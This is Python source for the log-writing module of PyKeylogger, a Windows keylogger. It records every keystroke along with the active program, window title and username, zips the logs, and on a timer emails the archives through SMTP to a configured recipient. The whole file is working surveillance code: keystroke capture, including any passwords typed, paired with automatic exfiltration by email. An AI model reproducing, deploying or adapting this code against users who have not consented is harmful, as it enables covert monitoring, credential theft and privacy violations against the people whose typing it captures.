##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2007  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import win32api, win32con, win32process
import os, os.path
import time
import re
import sys
import Queue
import traceback
import threading
import logging

# some utility functions
import myutils

# needed for automatic timed recurring events
import mytimer

# the following are needed for zipping the logfiles
import zipfile
	
# the following are needed for automatic emailing
import smtplib

# python 2.5 does some email things differently from python 2.4 and py2exe doesn't like it. 
# hence, the version check.
if sys.version_info[0] == 2 and sys.version_info[1] >= 5:
	from email.mime.multipart import MIMEMultipart 
	from email.mime.base import MIMEBase 
	from email.mime.text import MIMEText 
	from email.utils import COMMASPACE, formatdate 
	import email.encoders as Encoders
	
	#need these to work around py2exe
	import email.generator
	import email.iterators
	import email.utils
	import email.base64mime 
	
if sys.version_info[0] == 2 and sys.version_info[1] < 5:
	# these are for python 2.4 - they don't play nice with python 2.5 + py2exe.
	from email.MIMEMultipart import MIMEMultipart
	from email.MIMEBase import MIMEBase
	from email.MIMEText import MIMEText
	from email.Utils import COMMASPACE, formatdate
	from email import Encoders

class LogWriter(threading.Thread):
	'''Manages the writing of log files and logfile maintenance activities.
	'''
	def __init__(self, settings, cmdoptions, q):
		threading.Thread.__init__(self)
		self.finished = threading.Event()
		
		self.q = q
		self.settings = settings
		self.cmdoptions = cmdoptions
		
		self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")	  #regexp filter for the non-allowed characters in windows filenames.
		
		self.createLogger()
		#self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
		
		# initialize self.log to None, so that we dont attempt to flush it until it exists, and so we know to open it when it's closed.
		self.log = None
		
		# todo: no need for float() typecasting, since that is now taken care by config validation

		# initialize the automatic zip and email timer, if enabled in .ini
		if self.settings['E-mail']['SMTP Send Email'] == True:
			self.emailtimer = mytimer.MyTimer(float(self.settings['E-mail']['Email Interval'])*60*60, 0, self.SendZipByEmail)
			self.emailtimer.start()
		
		# initialize automatic old log deletion timer
		if self.settings['Log Maintenance']['Delete Old Logs'] == True:
			self.oldlogtimer = mytimer.MyTimer(float(self.settings['Log Maintenance']['Age Check Interval'])*60*60, 0, self.DeleteOldLogs)
			self.oldlogtimer.start()
				
		# initialize the automatic log flushing timer
		self.flushtimer = mytimer.MyTimer(float(self.settings['Log Maintenance']['Flush Interval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer"])
		self.flushtimer.start()
		
		#~ # start the event queue processing
		#~ self.queuetimer = mytimer.MyTimer(1, 1, self.start)
		#~ self.queuetimer.start()
		
		# initialize some automatic zip stuff
		#self.settings['Zip']['ziparchivename'] = "log_[date].zip"
		if self.settings['Zip']['Zip Enable'] == True:
			self.ziptimer = mytimer.MyTimer(float(self.settings['Zip']['Zip Interval'])*60*60, 0, self.ZipLogFiles)
			self.ziptimer.start()
			
		# initialize the log rotation job
		self.logrotatetimer = mytimer.MyTimer(float(self.settings['Log Maintenance']['Log Rotation Interval'])*60*60, 0, self.RotateLogs)
		self.logrotatetimer.start()

	def createLogger(self):
		
		self.logger = logging.getLogger('logwriter')
		self.logger.setLevel(logging.DEBUG)
		
		# create the "debug" handler - output messages to the console, to stderr, if debug option is set
		if self.cmdoptions.debug:
			loglevel = logging.DEBUG
		else:
			loglevel = logging.WARN
		
		consolehandler = logging.StreamHandler()
		consolehandler.setLevel(loglevel)
		formatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
		consolehandler.setFormatter(formatter)
		self.logger.addHandler(consolehandler)
		
		#~ logging.basicConfig(level=loglevel,
					#~ format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
		#~ self.logger = logging.getLogger('logwriter')
		
		# now let's try the systemlog file logging. 
		# if systemlog option is set, always output the debug messages to systemlog
		
		#first, make sure we have the directory where we want to log
		try:
			os.makedirs(self.settings['General']['Log Directory'], 0777) 
		except OSError, detail:
			if(detail.errno==17):  #if directory already exists, swallow the error
				pass
			else:
				#self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
				self.logger.error("error creating log directory", exc_info=sys.exc_info())
		except:
			#self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
			self.logger.error("error creating log directory", exc_info=sys.exc_info())
		
		if self.settings['General']['System Log'] != 'None':
			systemlogpath = os.path.join(self.settings['General']['Log Directory'], self.filter.sub(r'__',self.settings['General']['System Log']))
			systemloghandler = logging.FileHandler(systemlogpath)
			systemloghandler.setLevel(logging.DEBUG)
			systemloghandler.setFormatter(formatter)
			self.logger.addHandler(systemloghandler)
		
		#~ self.writeTarget = os.path.normpath(os.path.join(self.settings['General']['Log Directory'], self.filter.sub(r'__',self.settings['General']['Log File'])))

	def run(self):
		'''This is the main workhorse function.
		Keeps popping events off the queue, and processing them, until program quits
		'''
		## line format:
		## date; time (1 minute resolution); fullapppath; hwnd; username; window title; eventdata
		##
		## event data: ascii if normal key, escaped if "special" key, escaped if csv separator
		## self.processName = self.GetProcessNameFromHwnd(event.Window) #fullapppath
		## hwnd = event.Window
		## username = os.environ['USERNAME']
		## date = time.strftime('%Y%m%d') 
		## time = time.strftime('%H%m') #is this correct? or format event.time probably...
		## windowtitle = str(event.WindowName)
		
		# Logic: put the line into a list, check if all contents (except for eventdata) are equal, if so, just append eventdata to existing eventdata. otherwise, write out the previous event list, and start a new one.
		## on flush or on exit, make sure to write the latest dataline
		
		#self.stopflag=False
		self.eventlist = range(7) #initialize our eventlist to something.
		
		while not self.finished.isSet():
			try:
				event = self.q.get()
				
				loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
				if not loggable:
					if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
					continue
				if self.cmdoptions.debug: self.PrintDebug("loggable, lets log it. key: " + self.ParseEventValue(event))
				loggable = self.OpenLogFile() #will return true if log file has been opened without problems
				if not loggable:
					self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
					continue
				
				eventlisttmp = [time.strftime('%Y%m%d'), 
								time.strftime('%H%M'), 
								self.GetProcessNameFromHwnd(event.Window), 
								str(event.Window), 
								os.getenv('USERNAME'), 
								str(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), 
								unicode(self.ParseEventValue(event), 'latin-1')]
				if self.eventlist[:-1] == eventlisttmp[:-1]:
					self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1])
				else:
					self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
					self.eventlist = eventlisttmp
			## don't need this with infinite timeout?
			except Queue.Empty:
				self.PrintDebug("\nempty queue...\n")
				pass #let's keep iterating
			except:
				self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
				pass #let's keep iterating
		
		self.finished.set()
		
	def ParseEventValue(self, event):
		'''Pass the event ascii value through the requisite filters.
		Returns the result as a string.
		'''
		if chr(event.Ascii) == self.settings['General']['Log File Field Separator']:
			return('[sep_key]')
		
		#translate backspace into text string, if option is set.
		if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
			return('[KeyName:' + event.Key + ']')
		
		#translate escape into text string, if option is set.
		if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
			return('[KeyName:' + event.Key + ']')

		# need to parse the returns, so as not to break up the delimited data lines
		if event.Ascii == 13:
			return('[KeyName:' + event.Key + ']')
		
		#we translate all the special keys, such as arrows, backspace, into text strings for logging
		#exclude shift keys, because they are already represented (as capital letters/symbols)
		if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
			return('[KeyName:' + event.Key + ']')
		
		return(chr(event.Ascii))
		
	def WriteToLogFile(self):
		'''Write the latest eventlist to logfile in one delimited line
		'''
		
		if self.eventlist != range(7):
			try:
				line = unicode(self.settings['General']['Log File Field Separator'],'latin-1').join(self.eventlist) + "\n"
				self.PrintStuff(line)
			except:
				self.PrintDebug(str(self.eventlist), sys.exc_info())
				pass # let's keep going, even though this doesn't get logged...
				

	def TestForNoLog(self, event):
		'''This function returns False if the process name associated with an event
		is listed in the noLog option, and True otherwise.'''
		
		self.processName = self.GetProcessNameFromHwnd(event.Window)
		if self.settings['General']['Applications Not Logged'] != 'None':
			for path in self.settings['General']['Applications Not Logged'].split(';'):
				if os.stat(path) == os.stat(self.processName):	#we use os.stat instead of comparing strings due to multiple possible representations of a path
					return False
		return True

	def FlushLogWriteBuffers(self, logstring=""):
		'''Flush the output buffers and print a message to systemlog or stdout
		'''
		self.PrintDebug(logstring)
		if self.log != None: self.log.flush()
		#if self.settings['General']['System Log'] != 'None': self.systemlog.flush()

	def ZipLogFiles(self):
		'''Create a zip archive of all files in the log directory.
		
		Create archive name of type "log_YYYYMMDD_HHMMSS.zip
		'''
		self.FlushLogWriteBuffers("Flushing write buffers prior to zipping the logs\n")
		
		# just in case we decide change the zip filename structure later, let's be flexible
		zipFilePattern = "log_[date].zip"
		zipFileTime = time.strftime("%Y%m%d_%H%M%S")
		zipFileRawTime = time.time()
		zipFileName = re.sub(r"\[date\]", zipFileTime, zipFilePattern)
		
		# have to change to the dir so we dont get extra dir hierarchy in the zipfile
		originalDir = os.getcwd()
		os.chdir(self.settings['General']['Log Directory'])
		myzip = zipfile.ZipFile(zipFileName, "w", zipfile.ZIP_DEFLATED)
		
		for root, dirs, files in os.walk(os.curdir):
			for fname in files:
				#if fname != self.settings['ziparchivename']:
				if not self.CheckIfZipFile(fname):
					myzip.write(os.path.join(root,fname).split("\\",1)[1])
		
		myzip.close()
		myzip = zipfile.ZipFile(zipFileName, "r", zipfile.ZIP_DEFLATED)
		if myzip.testzip() != None:
			self.PrintDebug("Warning: Zipfile did not pass check.\n")
		myzip.close()
		
		# write the name of the last completed zip file
		# so that we can check against this when emailing or ftping, to make sure
		# we do not try to transfer a zipfile which is in the process of being created
		ziplog=open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'w')
		ziplog.write(zipFileName)
		ziplog.close()
		
		# chdir back
		os.chdir(originalDir)
		
		#now we can delete all the logs that have not been modified since we made the zip. 
		self.DeleteOldLogs(zipFileRawTime)
	
	def CheckIfZipFile(self, filename):
		'''Helper function for ZipLogFiles to make sure we don't include
		old zips into zip files.'''
		if re.match(r"^log_[0-9]{8}_[0-9]{6}\.zip$", filename) != None:
			return True
		else:
			return False
	
	def SendZipByEmail(self):
		'''Send the zipped logfile archive by email, using mail settings specified in the .ini file
		'''
		# basic logic flow:
		#~ if autozip is not enabled, just call the ziplogfiles function ourselves
		
		#~ read ziplog.txt (in a try block) and check if it conforms to being a proper zip filename
		#~ if not, then print error and get out
		
		#~ in a try block, read emaillog.txt to get latest emailed zip, and check for proper filename
			#~ if fail, just go ahead with sending all available zipfiles
		
		#~ do a os.listdir() on the dirname, and trim it down to only contain our zipfiles
			#~ and moreover, only zipfiles with names between lastemailed and latestzip, including latestzip,
			#~ but not including lastemailed.
		
		#~ send all the files in list
		
		#~ write new lastemailed to emaillog.txt
		
		self.PrintDebug("Sending mail to " + self.settings['E-mail']['SMTP To'] + "\n")
		
		if self.settings['Zip']['Zip Enable'] == False or os.path.isfile(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt")) == False:
			self.ZipLogFiles()
		
		try:
			ziplog = open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'r')
			latestZipFile = ziplog.readline()
			ziplog.close()
			if not self.CheckIfZipFile(latestZipFile):
				self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
				return
		except:
			self.PrintDebug("Unexpected error opening ziplog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
			return
		
		#~ if not self.CheckIfZipFile(latestZipFile):
			#~ self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
			#~ return
		
		try:
			latestZipEmailed = "" #initialize to blank, just in case emaillog.txt doesn't get read
			emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'r')
			latestZipEmailed = emaillog.readline()
			emaillog.close()
			if not self.CheckIfZipFile(latestZipEmailed):
				self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
				return
		except:
			self.PrintDebug("Error opening emaillog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\nWill email all available log zips.\n")
		
		zipFileList = os.listdir(self.settings['General']['Log Directory'])
		self.PrintDebug(str(zipFileList))
		if len(zipFileList) > 0:
			# removing elements from a list while iterating over it produces undesirable results
			# so we do the os.listdir again to iterate over
			for filename in os.listdir(self.settings['General']['Log Directory']):
				if not self.CheckIfZipFile(filename):
					zipFileList.remove(filename)
					self.PrintDebug("removing " + filename + " from zipfilelist because it's not a zipfile\n")
				# we can do the following string comparison due to the structured and dated format of the filenames
				elif filename <= latestZipEmailed or filename > latestZipFile:
					zipFileList.remove(filename)
					self.PrintDebug("removing " + filename + " from zipfilelist because it's not in range\n")
		
		self.PrintDebug(str(zipFileList))
		
		# set up the message
		msg = MIMEMultipart()
		msg['From'] = self.settings['E-mail']['SMTP From']
		msg['To'] = COMMASPACE.join(self.settings['E-mail']['SMTP To'].split(";"))
		msg['Date'] = formatdate(localtime=True)
		msg['Subject'] = self.settings['E-mail']['SMTP Subject']

		msg.attach( MIMEText(self.settings['E-mail']['SMTP Message Body']) )

		if len(zipFileList) == 0:
			msg.attach( MIMEText("No new logs present.") )

		if len(zipFileList) > 0:
			for file in zipFileList:
				part = MIMEBase('application', "octet-stream")
				part.set_payload( open(os.path.join(self.settings['General']['Log Directory'], file),"rb").read() )
				Encoders.encode_base64(part)
				part.add_header('Content-Disposition', 'attachment; filename="%s"'
							   % os.path.basename(file))
				msg.attach(part)

		# set up the server and send the message
		mysmtp = smtplib.SMTP(self.settings['E-mail']['SMTP Server'], self.settings['E-mail']['SMTP Port'])
		
		if self.cmdoptions.debug: 
			mysmtp.set_debuglevel(1)
		if self.settings['E-mail']['SMTP Use TLS'] == True:
			# we find that we need to use two ehlos (one before and one after starttls)
			# otherwise we get "SMTPException: SMTP AUTH extension not supported by server"
			# thanks for this solution go to http://forums.belution.com/en/python/000/009/17.shtml
			mysmtp.ehlo()
			mysmtp.starttls()
			mysmtp.ehlo()
		if self.settings['E-mail']['SMTP Needs Login'] == True:
			mysmtp.login(self.settings['E-mail']['SMTP Username'], myutils.password_recover(self.settings['E-mail']['SMTP Password']))
		sendingresults = mysmtp.sendmail(self.settings['E-mail']['SMTP From'], self.settings['E-mail']['SMTP To'].split(";"), msg.as_string())
		self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
		
		# need to put the quit in a try, since TLS connections may error out due to bad implementation with
		# socket.sslerror: (8, 'EOF occurred in violation of protocol')
		# Most SSL servers and clients (primarily HTTP, but some SMTP as well) are broken in this regard: 
		# they do not properly negotiate TLS connection shutdown. This error is otherwise harmless.
		# reference URLs:
		# http://groups.google.de/group/comp.lang.python/msg/252b421a7d9ff037
		# http://mail.python.org/pipermail/python-list/2005-August/338280.html
		try:
			mysmtp.quit()
		except:
			pass
		
		# write the latest emailed zip to log for the future
		if len(zipFileList) > 0:
			zipFileList.sort()
			emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'w')
			emaillog.write(zipFileList.pop())
			emaillog.close()
	
	def OpenLogFile(self):
		'''Open the appropriate log file, depending on event properties and settings in .ini file.
		Now, we only need to open the one file delimited logfile
		'''
		
		# do stuff only if file is closed. if it is open, we don't have to do anything at all, just return true.
		if self.log == None: 
			# Filter out any characters that are not allowed as a windows filename, just in case the user put them into the config file
			self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
			self.writeTarget = os.path.normpath(os.path.join(self.settings['General']['Log Directory'], self.settings['General']['Log File']))
			try:
				self.log = open(self.writeTarget, 'a')
				self.PrintDebug("writing to: " + self.writeTarget)
				return True
			except OSError, detail:
				if(detail.errno==17):  #if file already exists, swallow the error
					pass
				else:
					self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
					return False
			except:
				self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
				return False
		else:
			return True
		
	def PrintStuff(self, stuff):
		'''Write stuff to log, or to debug outputs.
		'''
		if not self.cmdoptions.debug and self.log != None:
			self.log.write(stuff)
		if self.cmdoptions.debug:
			self.PrintDebug(stuff)

	def PrintDebug(self, stuff, exc_info=False):
		'''Write stuff to console and/or systemlog.
		'''
		#~ if self.cmdoptions.debug:
			#~ sys.stdout.write(stuff)
		#~ if self.settings['General']['System Log'] != 'None':
			#~ self.systemlog.write(stuff)
		self.logger.debug(stuff, exc_info=exc_info)

	def WriteTimestamp(self):
		'''deprecated'''
		self.PrintStuff("\n[" + time.asctime() + "]\n")

	def RotateLogs(self):
		'''This will close the log file, set self.log to None, move the file to a dated filename.
		Then, openlogfile will take care of opening a fresh logfile by itself.'''
		
		if self.log != None:
			rotateTarget = os.path.normpath(os.path.join(self.settings['General']['Log Directory'], time.strftime("%Y%m%d_%H%M%S") + '_' + self.settings['General']['Log File']))
			self.PrintDebug("\nRenaming\n" + self.writeTarget + "\nto\n" + rotateTarget + "\n")
			self.log.close()
			self.log = None
			try:
				os.rename(self.writeTarget, rotateTarget)
			except: 
				self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
		

	def DeleteOldLogs(self, lastmodcutoff=None):
		'''Walk the log directory tree and remove old logfiles.

		if lastmodcutoff is not supplied, delete files older than maxlogage, as specified in .ini file.
		
		if lastmodcutoff is supplied [in seconds since epoch, as supplied by time.time()],
		instead delete files that were not modified after lastmodcutoff.
		'''
		
		
		self.PrintDebug("Analyzing and removing old logfiles.\n")
		for root, dirs, files in os.walk(self.settings['General']['Log Directory']):
			for fname in files:
				if lastmodcutoff == None:
					testvalue = time.time() - os.path.getmtime(os.path.join(root,fname)) > float(self.settings['Log Maintenance']['Max Log Age'])*24*60*60
				elif type(lastmodcutoff) == float:
					testvalue = os.path.getmtime(os.path.join(root,fname)) < lastmodcutoff
				
				if fname == "emaillog.txt" or fname == "ziplog.txt":
					testvalue = False # we don't want to delete these
				
				if type(lastmodcutoff) == float and self.CheckIfZipFile(fname):
					testvalue = False # we don't want to delete zipped logs, unless running on timer and using maxlogage
				
				if testvalue:
					try:
						os.remove(os.path.join(root,fname))
					except:
						self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
					try:
						os.rmdir(root)
					except:
						self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")

	def GetProcessNameFromHwnd(self, hwnd):
		'''Acquire the process name from the window handle for use in the log filename.
		'''
		threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
		
		# PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
		
		mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
		procname = win32process.GetModuleFileNameEx(mypyproc, 0)
		return procname

	def cancel(self):
		'''To exit cleanly, flush all write buffers, and stop all running timers.
		'''
		#self.stopflag = True
		#time.sleep(2.5)
		#self.queuetimer.cancel()
		self.finished.set()
		
		self.WriteToLogFile()
		self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
		logging.shutdown()
		self.flushtimer.cancel()
		
		self.logrotatetimer.cancel()
		
		if self.settings['E-mail']['SMTP Send Email'] == True:
			self.emailtimer.cancel()
		if self.settings['Log Maintenance']['Delete Old Logs'] == True:
			self.oldlogtimer.cancel()
		#~ if self.settings['Timestamp']['Timestamp Enable'] == True:
			#~ self.timestamptimer.cancel()
		if self.settings['Zip']['Zip Enable'] == True:
			self.ziptimer.cancel()
		

if __name__ == '__main__':
	#some testing code
	#put a real existing hwnd into event.Window to run test
	#this testing code is now really outdated and useless.
	lw = LogWriter()
	class Blank:
		pass
	event = Blank()
	event.Window = 264854
	event.WindowName = "Untitled - Notepad"
	event.Ascii = 65
	event.Key = 'A'
	options = Blank()
	options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
	options.flushKey = 'F11'
	lw.WriteToLogFile(event, options)
	
